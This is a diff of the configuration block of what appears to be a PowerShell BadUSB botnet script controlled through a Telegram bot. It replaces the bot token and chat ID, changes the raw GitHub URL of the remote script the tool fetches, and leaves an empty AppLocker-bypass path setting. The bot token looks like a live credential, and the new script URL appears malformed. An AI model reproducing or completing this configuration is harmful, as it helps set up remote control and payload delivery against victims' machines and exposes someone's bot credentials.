@@ -19,9 +19,9 @@ BOT TELEGRAM:
 ## CONFIG ##
 ############
 
-$BotToken = "987135147:AAFn42sOzRBlhtud33MPnEd48kYgepFSE5I"
-$ChatID = '184832283'
-$githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'
+$BotToken = "5666049912:AAHZth6IPRFSKVjx-6sYNLtR4hEOo92tqhA"
+$ChatID = '-1001799282824'
+$githubScript = 'https://raw.githubusercontent.com/alexfranpsv1.ps1'
 $pathbypassapplocker = ""
 
 
